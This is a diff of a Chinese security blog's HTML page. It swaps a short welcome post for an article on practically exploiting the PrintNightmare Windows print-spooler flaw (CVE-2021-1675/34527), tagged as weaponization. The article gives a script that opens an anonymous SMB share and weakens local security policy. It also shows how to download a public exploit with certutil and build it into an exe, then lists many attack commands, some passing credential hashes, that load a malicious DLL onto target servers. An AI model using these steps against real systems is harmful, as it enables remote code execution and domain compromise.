@@ -16,23 +16,28 @@
   <meta name="author" content="qwqdanchun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="历时半个多月，删站的我又把博客搭起来了，这次从用了五年的Wordpress换成了Hexo，自动部署的纯静态博客似乎也是不错的 不过之前的文章没有保存了，很多都是早年写的东西，现在看来已经没有意义了 后面会尽量恢复记笔记的习惯，也就顺手更一些文章吧，希望我的文章可以帮到你">
+    <meta name="description" content="概述CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节 复现攻击环境注意事项1.域相关目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Ser">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World Again">
-<meta property="og:url" content="https://blog.qwqdanchun.com/2022/11/11/hello-world/index.html">
+<meta property="og:title" content="PrintNightmare 实战利用Tips">
+<meta property="og:url" content="https://blog.qwqdanchun.com/PrintNightmare/index.html">
 <meta property="og:site_name" content="簞純&#39;s Blog">
-<meta property="og:description" content="历时半个多月，删站的我又把博客搭起来了，这次从用了五年的Wordpress换成了Hexo，自动部署的纯静态博客似乎也是不错的 不过之前的文章没有保存了，很多都是早年写的东西，现在看来已经没有意义了 后面会尽量恢复记笔记的习惯，也就顺手更一些文章吧，希望我的文章可以帮到你">
+<meta property="og:description" content="概述CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节 复现攻击环境注意事项1.域相关目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Ser">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-11T11:15:50.000Z">
-<meta property="article:modified_time" content="2022-11-13T00:42:21.887Z">
+<meta property="article:published_time" content="2022-11-12T19:34:50.000Z">
+<meta property="article:modified_time" content="2022-11-13T08:48:33.374Z">
 <meta property="article:author" content="qwqdanchun">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="PrintNightmare">
+<meta property="article:tag" content="CVE-2021-1675">
+<meta property="article:tag" content="CVE-2021-34527">
+<meta property="article:tag" content="武器化">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Hello World Again - 簞純&#39;s Blog</title>
+  <title>PrintNightmare 实战利用Tips - 簞純&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -209,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World Again"></span>
+            <span id="subtitle" data-typed-text="PrintNightmare 实战利用Tips"></span>
           
         </div>
 
@@ -225,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-11 19:15" pubdate>
-          2022年11月11日 晚上
+        <time datetime="2022-11-13 03:34" pubdate>
+          2022年11月13日 凌晨
         </time>
       </span>
     
@@ -237,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          133 字
+          3.6k 字
         
       </span>
     
@@ -248,7 +253,7 @@
         
         
         
-          2 分钟
+          31 分钟
         
       </span>
     
@@ -301,17 +306,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="生活"
-        id="heading-aefcbfca08c840aeb8bd72dc1c8ff7f9" role="tab" data-toggle="collapse" href="#collapse-aefcbfca08c840aeb8bd72dc1c8ff7f9"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="漏洞"
+        id="heading-f58f4896d3ac66f9216963b2c98e4412" role="tab" data-toggle="collapse" href="#collapse-f58f4896d3ac66f9216963b2c98e4412"
         aria-expanded="true"
       >
-        生活
+        漏洞
         <span class="list-group-count">(1)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-aefcbfca08c840aeb8bd72dc1c8ff7f9"
-           role="tabpanel" aria-labelledby="heading-aefcbfca08c840aeb8bd72dc1c8ff7f9">
+      <div class="category-collapse collapse show" id="collapse-f58f4896d3ac66f9216963b2c98e4412"
+           role="tabpanel" aria-labelledby="heading-f58f4896d3ac66f9216963b2c98e4412">
         
         
           
@@ -320,10 +325,10 @@
     
       
       
-        <a href="/2022/11/11/hello-world/" title="Hello World Again"
+        <a href="/PrintNightmare/" title="PrintNightmare 实战利用Tips"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">Hello World Again</span>
+          <span class="category-post">PrintNightmare 实战利用Tips</span>
         </a>
       
     
@@ -346,12 +351,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World Again</h1>
+            <h1 style="display: none">PrintNightmare 实战利用Tips</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年11月13日 早上
+                    本文最后更新于：2022年11月13日 下午
                   
                 
               </p>
@@ -359,9 +364,24 @@
             
               <div class="markdown-body">
                 
-                <p>历时半个多月，删站的我又把博客搭起来了，这次从用了五年的Wordpress换成了Hexo，自动部署的纯静态博客似乎也是不错的</p>
-<p>不过之前的文章没有保存了，很多都是早年写的东西，现在看来已经没有意义了</p>
-<p>后面会尽量恢复记笔记的习惯，也就顺手更一些文章吧，希望我的文章可以帮到你</p>
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h1><p><strong>CVE-2021-1675 / CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节</strong></p>
+<h2 id="复现攻击环境"><a href="#复现攻击环境" class="headerlink" title="复现攻击环境"></a>复现攻击环境</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="1-域相关"><a href="#1-域相关" class="headerlink" title="1.域相关"></a>1.域相关</h4><p>目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可</p>
+<blockquote>
+<p>加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制</p>
+</blockquote>
+<h4 id="2-SMBv1"><a href="#2-SMBv1" class="headerlink" title="2.SMBv1"></a>2.SMBv1</h4><p>攻击机器为Windows Server 2019及更高版本时，需要执行 <code>Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol</code>并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 <code>Set-SmbServerConfiguration -EnableSMB1Protocol $true</code>开启SMBv1的支持</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-准备payload"><a href="#1-准备payload" class="headerlink" title="1.准备payload"></a>1.准备payload</h3><p>在攻击机器创建C:\share文件夹，并将dll放入其中（此路径可根据需求修改，修改后下一步脚本自行对应修改）</p>
+<h3 id="2-开启SMB匿名共享"><a href="#2-开启SMB匿名共享" class="headerlink" title="2.开启SMB匿名共享"></a>2.开启SMB匿名共享</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-comment">#修改路径权限，使所有人可读</span><br>icacls C:\share\ /T /grant Anonymous` logon:F<br>icacls C:\share\ /T /grant Everyone:F<br><span class="hljs-comment">#创建名称为share路径为C:\share的SMB共享</span><br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Path</span> C:\share <span class="hljs-literal">-Name</span> share <span class="hljs-literal">-FullAccess</span> <span class="hljs-string">&#x27;ANONYMOUS LOGON&#x27;</span>,<span class="hljs-string">&#x27;Everyone&#x27;</span><br><span class="hljs-comment">#启用guest用户</span><br>net user guest /active:yes<br><span class="hljs-comment">#覆盖已有的NullSessionPipes配置</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f<br><span class="hljs-comment">#设置可以匿名访问共享</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionShares /t REG_MULTI_SZ /d share /f<br><span class="hljs-comment">#设置Everyone权限包含匿名登录用户</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v EveryoneIncludesAnonymous /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><span class="hljs-comment">#设置任何用户都可以通过网络获取本机的信息</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v RestrictAnonymous /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><span class="hljs-comment">#提取本地安全组策略</span><br>secedit /export /cfg gp.inf /quiet<br><span class="hljs-comment">#修改组策略中的指定权限</span><br>(<span class="hljs-built_in">Get-Content</span> gp.inf) <span class="hljs-operator">-replace</span> <span class="hljs-string">&quot;SeDenyNetworkLogonRight = Guest&quot;</span>,<span class="hljs-string">&quot;SeDenyNetworkLogonRight = &quot;</span> | <span class="hljs-built_in">Set-Content</span> <span class="hljs-string">&quot;gp.inf&quot;</span><br><span class="hljs-comment">#导入本地安全组策略</span><br>secedit /configure /db gp.sdb /cfg gp.inf /quiet<br><span class="hljs-comment">#更新本地安全组策略</span><br>CMD.EXE /C <span class="hljs-string">&quot;gpupdate/force&quot;</span><br><span class="hljs-comment">#清理文件</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.inf&quot;</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.sdb&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>注：此脚本修改自<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">Invoke-BuildAnonymousSMBServer</a></p>
+<h3 id="3-准备exp"><a href="#3-准备exp" class="headerlink" title="3.准备exp"></a>3.准备exp</h3><h4 id="选择exp"><a href="#选择exp" class="headerlink" title="选择exp"></a>选择exp</h4><p>推荐exp为<a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py">CVE-2021-1675.py</a>，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多</p>
+<p>因为大部分目标环境不会有python环境，所以最好打包为exe使用</p>
+<h4 id="打包exe"><a href="#打包exe" class="headerlink" title="打包exe"></a>打包exe</h4><p>打包使用Windows 7机器，安装<a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe">Python3.8</a>，<a target="_blank" rel="noopener" href="https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe">Git</a>，之后执行以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/cube0x0/impacket<br><span class="hljs-built_in">cd</span> impacket<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py<br>pip3 install six pycryptodomex pyasn1 pyinstaller<br>pyinstaller --clean --onefile CVE-2021-1675.py<br></code></pre></td></tr></table></figure>
+
+<p>生成的文件在<code>\impacket\dist\CVE-2021-1675.exe</code></p>
+<h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h3><p>示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -380,7 +400,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%94%9F%E6%B4%BB/" class="category-chain-item">生活</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="category-chain-item">漏洞</a>
   
   
 
@@ -392,6 +412,21 @@
     </div>
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+      
+        <a href="/tags/PrintNightmare/">#PrintNightmare</a>
+      
+        <a href="/tags/CVE-2021-1675/">#CVE-2021-1675</a>
+      
+        <a href="/tags/CVE-2021-34527/">#CVE-2021-34527</a>
+      
+        <a href="/tags/%E6%AD%A6%E5%99%A8%E5%8C%96/">#武器化</a>
+      
+    </div>
+  
 </div>
 
 
@@ -400,8 +435,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World Again</div>
-      <div>https://blog.qwqdanchun.com/2022/11/11/hello-world/</div>
+      <div>PrintNightmare 实战利用Tips</div>
+      <div>https://blog.qwqdanchun.com/PrintNightmare/</div>
     </div>
     <div class="license-meta">
       
@@ -413,7 +448,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月11日</div>
+          <div>2022年11月13日</div>
         </div>
       
       
@@ -456,15 +491,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/12/PrintNightmare/" title="PrintNightmare 实战利用Tips">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PrintNightmare 实战利用Tips</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/hello-world/" title="Hello World Again">
+                        <span class="hidden-mobile">Hello World Again</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
